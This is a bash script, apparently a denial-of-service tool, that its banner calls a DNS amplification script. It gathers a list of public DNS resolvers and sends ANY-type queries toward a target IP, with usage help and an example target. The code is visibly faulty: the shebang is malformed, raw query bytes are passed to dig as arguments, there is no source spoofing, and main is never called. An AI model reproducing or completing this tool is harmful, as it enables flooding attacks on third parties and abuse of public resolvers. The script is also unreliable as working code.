#!bin/bash

function get_public_dns_servers {
    
    source .env
    TMP_FILE=$(mktemp)

    curl -s $DNS_SERVER_LIST_URL > $TMP_FILE
    DNS_SERVERS=$(cat $TMP_FILE | grep -v '#' | awk '{print $1}')

    echo $DNS_SERVERS > $DNS_SERVER_LIST_FILE
    rm $TMP_FILE
}

function read_dns_servers {
    DNS_SERVERS=$(cat dns_servers.txt)
    echo $DNS_SERVERS
}

amplify() {
    local target_ip="$1"
    local query_type="ANY"
    local dns_server="8.8.8.8"
    local port="53"

    while getopts "t:s:p:" opt; do
        case "${opt}" in
            t) query_type="${OPTARG}" ;;
            s) dns_server="${OPTARG}" ;;
            p) port="${OPTARG}" ;;
            *) banner; return 1 ;;
        esac
    done

    local query="$(echo -ne '\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00')"
    query="${query}$(echo -ne "${query_type}" | xxd -p -c1)"
    query="${query}$(echo -ne '\x00\x01')"

    local response="$(timeout 2s dig @${dns_server} -p ${port} ${target_ip} ${query} +tries=1 +time=1 +noedns +noad +nocl +nolookup +noadditional +nostats +nocmd +noquestion +nocomments +noclass +nostderr +noanswer +noauthority +noheader +short)"

    if [[ -n "${response}" ]]; then
        echo "${response}"
    else
        echo "No response received"
    fi
}

function banner {
    echo -e "\e[38;5;208m===================================="
    echo -e "\e[38;5;208m   DNS Amplification Script Usage   "
    echo -e "\e[38;5;208m===================================="
    echo -e "\e[38;5;39mUsage: dns-bash <target_ip> [Options]"
    echo  ""
    echo -e "\e[38;5;39mOptions:"
    echo -e "\e[38;5;39m  -t <query_type>  Query type (default: ANY)"
    echo -e "\e[38;5;39m  -s <dns_server>  DNS server (default: 8.8.8.8)"
    echo -e "\e[38;5;39m  -p <port>        DNS server port (default: 53)"
    echo ""
    echo -e "\e[38;5;39mExample: dns-bash 192.168.1.100 -t ANY -s 1.1.1.1 -p 53"
}

function main {
    if [ $# -eq 0 ]; then
        banner
        exit 1
    fi
    
    TARGET_IP="$1"
    shift

    QUERY_TYPE="ANY"
    DNS_SERVER=""
    PORT="53"

    while [[ $# -gt 0 ]]; do
        key="$1"
        case $key in
            -t|--query-type)
            QUERY_TYPE="$2"
            shift
            shift
            ;;
            -s|--dns-server)
            DNS_SERVER="$2"
            shift
            shift
            ;;
            -p|--port)
            PORT="$2"
            shift
            shift
            ;;
            *)
            echo "Unknown option: $1"
            exit 1
            ;;
        esac
    done

    get_public_dns_servers
}

amplify 192.168.2.1